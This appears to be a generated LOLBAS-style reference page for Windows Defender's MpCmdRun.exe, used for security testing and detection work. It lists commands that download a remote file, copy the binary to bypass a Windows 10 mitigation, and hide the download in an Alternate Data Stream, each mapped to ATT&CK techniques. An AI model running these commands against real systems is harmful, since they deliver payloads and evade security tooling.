---
parsed_by: focuslocust
source: commands
type: generated
---
# MpCmdRun Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## MpCmdRun.exe

Tool page: [MpCmdRun.exe](../../tools/windows/mpcmdrun.exe.md)

### Download file

```text
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
```

Description:

Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/MpCmdRun.yml` |
| Evidence | Command preserved from source parser. |

### Download file

```text
copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
```

Description:

Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/MpCmdRun.yml` |
| Evidence | Command preserved from source parser. |

### Hide downloaded data into an Alternate Data Stream

```text
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
```

Description:

Download file to machine and store it in Alternate Data Stream

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/MpCmdRun.yml` |
| Evidence | Command preserved from source parser. |
